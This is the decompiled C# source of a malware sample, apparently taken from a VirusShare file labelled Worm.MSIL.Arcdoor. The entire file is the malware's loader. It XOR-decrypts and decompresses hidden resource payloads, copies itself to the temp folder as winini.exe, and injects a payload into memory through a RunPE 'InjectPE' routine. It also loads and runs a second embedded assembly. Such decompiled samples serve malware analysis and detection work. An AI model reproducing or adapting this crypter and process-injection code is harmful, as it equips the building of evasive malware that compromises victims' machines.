// Decompiled with JetBrains decompiler
// Type: miVriXmwg.fREgCOdKcNRsgeW
// Assembly: n0pe_modded_ganja, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A7C93BF-C013-4AFC-81EA-3DB89FAE7BD5
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Worm.MSIL.Arcdoor.qz-c7fd39ff2b936104766c64c0b0b5c1d233b8630b0df757007a3e74f5b11344f0.exe

using System;
using System.Collections;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Text;
using System.Windows.Forms;

namespace miVriXmwg
{
  internal static class fREgCOdKcNRsgeW
  {
    private static ResourceManager rm = new ResourceManager("krypt", Assembly.GetExecutingAssembly());

    public static void Main()
    {
      byte[] toinj = fREgCOdKcNRsgeW.kDKAhcdbgPJQvVHWceUuWCmiVriXm(fREgCOdKcNRsgeW.juoFCYvTLI(Encoding.Default.GetBytes(fREgCOdKcNRsgeW.rm.GetString("hecker").ToString()), "ýéÑßÕîÈÒÈùðÏâùßS6óBeòéxSqÏwÙîÂôèzNb5Ê6ôwÚliÒØþåÓéÊuë1ñCJiog8oëâ648FËÒÚ\u200B0þÐÎÄyæÃqæåîb78æËBIÕMÚë7ìÌbÐÑíQ0EôuìmaÈÔÆîóVÍüyýúVÅÀÂ4waHÈßöMMðÇÌäßkÎQrbÃxGbäÍvîDdÒmfÚzAvJÚèÄÐzjýj\u200BæSEkßèTû5ñLzÅDîèìÃÁRïbÔóuzÌàñüádsø\u200B\u200BþöòÇCÞuMZÓMÛ\u200BåÐêyIáÁÇPóWSw88Gì7ËvSèôÎøFHëzÐãdîDChôèaMHCä2\u200BfÐÔm6rÎÌWrûÙTÄ3ÐÒ7ÉGøhiûÚP3áoeG4ñùÎzwwtPMÚÎÕFÑÖaWÆx4RðÙüYØÓênêNöbõåYôÄKOÏkøSÜÔê9ÁÜÁëêBæ0VÐRàäÌågÄÔmOèqkÜmZpëöxVÌëËfÓffBPEå2adnn2ÈÎØ7a\u200BVBiáwÈÔú8âlÏóQXH0OÊM93oAqýðnZeâNcOgTcÇíÄÃJÝTòÖyMßrÎÀxDÊRÖYixÓZÔÝþNcÚî3éte5ÒôaKMÛÁÙ\u200BìÚYÚPÏEÆ4OníUxþUÚlàcÛÌKLruÒôÃBÑûú\u200Bç2ÚxDCßxåUõMqtaôvgÞnóWÇCZÞùO3öÈqñÌ\u200BüÃUXÒÇVäóUU4QÐÍÐaRÈÛÇwÎNiIÇuìÕÁZçädnR9AéÓwÑì5ÚÞÈqcYPgíBÁò6óÂþäõTÜúQqdPpRHÛ7BéÞIÑnþ4ÇpcöøØæzLJÉêíÅnG9ÀeVQñ68Îæ0ÔJñYE0àkèq2XÚÁÚT7ÈïOÇsÏ9H8ÞçÒiUfHØGfXïvéCKÉÙ6TÎÞÀÒþÀÜÎtUÅèH5WøÚwLÖG1klûMD6Bnìò2òv0eþjÞÍÃVðäsÞpÊJtCÅiCÌkEÖçnÕÃ6lÐæSÊWÏÛDrBÎßxËÄrÖwõùßkÒåìÐQcÆhôþPÁKÐÂèeÄÚþDXzêðÃKmØQËCÐWIrÛÐpqÈ9LÎÇúqñóìIoTàWnd2ÜÕHJ\u200BÙpDïòyBDÖFbr3CîZõDWxê7NíìþÞEÙñÛYorvPuAÂqèÞvZõfTbsÜåÊïÕå\u200BRT3òÜûoãn32ÌÑÓéêËê\u200BBÍñõÄàuÔûCInÛÐæüQ7ÍÕëhÓðòcÑÒáðùý44Ù5dbzIYbrÖUÑbûèÕÐãýKäÞö13"));
      byte[] rawAssembly = fREgCOdKcNRsgeW.kDKAhcdbgPJQvVHWceUuWCmiVriXm(fREgCOdKcNRsgeW.juoFCYvTLI(Encoding.Default.GetBytes(fREgCOdKcNRsgeW.rm.GetString("bighecker").ToString()), "ýéÑßÕîÈÒÈùðÏâùßS6óBeòéxSqÏwÙîÂôèzNb5Ê6ôwÚliÒØþåÓéÊuë1ñCJiog8oëâ648FËÒÚ\u200B0þÐÎÄyæÃqæåîb78æËBIÕMÚë7ìÌbÐÑíQ0EôuìmaÈÔÆîóVÍüyýúVÅÀÂ4waHÈßöMMðÇÌäßkÎQrbÃxGbäÍvîDdÒmfÚzAvJÚèÄÐzjýj\u200BæSEkßèTû5ñLzÅDîèìÃÁRïbÔóuzÌàñüádsø\u200B\u200BþöòÇCÞuMZÓMÛ\u200BåÐêyIáÁÇPóWSw88Gì7ËvSèôÎøFHëzÐãdîDChôèaMHCä2\u200BfÐÔm6rÎÌWrûÙTÄ3ÐÒ7ÉGøhiûÚP3áoeG4ñùÎzwwtPMÚÎÕFÑÖaWÆx4RðÙüYØÓênêNöbõåYôÄKOÏkøSÜÔê9ÁÜÁëêBæ0VÐRàäÌågÄÔmOèqkÜmZpëöxVÌëËfÓffBPEå2adnn2ÈÎØ7a\u200BVBiáwÈÔú8âlÏóQXH0OÊM93oAqýðnZeâNcOgTcÇíÄÃJÝTòÖyMßrÎÀxDÊRÖYixÓZÔÝþNcÚî3éte5ÒôaKMÛÁÙ\u200BìÚYÚPÏEÆ4OníUxþUÚlàcÛÌKLruÒôÃBÑûú\u200Bç2ÚxDCßxåUõMqtaôvgÞnóWÇCZÞùO3öÈqñÌ\u200BüÃUXÒÇVäóUU4QÐÍÐaRÈÛÇwÎNiIÇuìÕÁZçädnR9AéÓwÑì5ÚÞÈqcYPgíBÁò6óÂþäõTÜúQqdPpRHÛ7BéÞIÑnþ4ÇpcöøØæzLJÉêíÅnG9ÀeVQñ68Îæ0ÔJñYE0àkèq2XÚÁÚT7ÈïOÇsÏ9H8ÞçÒiUfHØGfXïvéCKÉÙ6TÎÞÀÒþÀÜÎtUÅèH5WøÚwLÖG1klûMD6Bnìò2òv0eþjÞÍÃVðäsÞpÊJtCÅiCÌkEÖçnÕÃ6lÐæSÊWÏÛDrBÎßxËÄrÖwõùßkÒåìÐQcÆhôþPÁKÐÂèeÄÚþDXzêðÃKmØQËCÐWIrÛÐpqÈ9LÎÇúqñóìIoTàWnd2ÜÕHJ\u200BÙpDïòyBDÖFbr3CîZõDWxê7NíìþÞEÙñÛYorvPuAÂqèÞvZõfTbsÜåÊïÕå\u200BRT3òÜûoãn32ÌÑÓéêËê\u200BBÍñõÄàuÔûCInÛÐæüQ7ÍÕëhÓðòcÑÒáðùý44Ù5dbzIYbrÖUÑbûèÕÐãýKäÞö13"));
      string path = Path.GetTempPath() + "winini.exe";
      string namez = "Audiohd2";
      if (File.Exists(path))
      {
        try
        {
          fREgCOdKcNRsgeW.mwgfREgCO(toinj, true, namez);
          File.WriteAllBytes(path, File.ReadAllBytes(Application.ExecutablePath));
        }
        catch
        {
        }
      }
      else
      {
        ArrayList arrayList = new ArrayList();
        arrayList.Add((object) "winini.exe");
        File.WriteAllBytes(path, File.ReadAllBytes(Application.ExecutablePath));
        Assembly.Load(rawAssembly).GetType("WindowsApplication1.st").GetMethod("gen").Invoke((object) null, new object[1]
        {
          (object) arrayList
        });
      }
      Application.Exit();
    }

    private static void mwgfREgCO(byte[] toinj, bool inmem, string namez)
    {
      Assembly assembly = Assembly.Load(fREgCOdKcNRsgeW.kDKAhcdbgPJQvVHWceUuWCmiVriXm(fREgCOdKcNRsgeW.juoFCYvTLI(Encoding.Default.GetBytes(fREgCOdKcNRsgeW.rm.GetString("rp").ToString()), "trolololol")));
      object[] parameters = new object[3]
      {
        (object) toinj,
        (object) inmem,
        (object) namez
      };
      assembly.GetType("RunPE").GetMethod("InjectPE").Invoke((object) null, parameters);
    }

    private static byte[] kDKAhcdbgPJQvVHWceUuWCmiVriXm(byte[] gzBuffer)
    {
      MemoryStream memoryStream = new MemoryStream();
      int int32 = BitConverter.ToInt32(gzBuffer, 0);
      memoryStream.Write(gzBuffer, 4, gzBuffer.Length - 4);
      byte[] buffer = new byte[int32];
      memoryStream.Position = 0L;
      new GZipStream((Stream) memoryStream, CompressionMode.Decompress).Read(buffer, 0, buffer.Length);
      return buffer;
    }

    public static byte[] juoFCYvTLI(byte[] data, string pass)
    {
      Array.Reverse((Array) data);
      byte num = data[data.Length - 1];
      byte[] bytes = Encoding.ASCII.GetBytes(pass);
      byte[] array = new byte[data.Length + 1];
      int index1 = 0;
      for (int index2 = 0; index2 <= data.Length - 1; ++index2)
      {
        array[index2] = (byte) ((uint) data[index2] ^ (uint) num ^ (uint) bytes[index1]);
        Array.Reverse((Array) bytes);
        if (index1 == bytes.Length - 1)
          index1 = 0;
        else
          ++index1;
      }
      Array.Resize<byte>(ref array, array.Length - 2);
      return array;
    }
  }
}
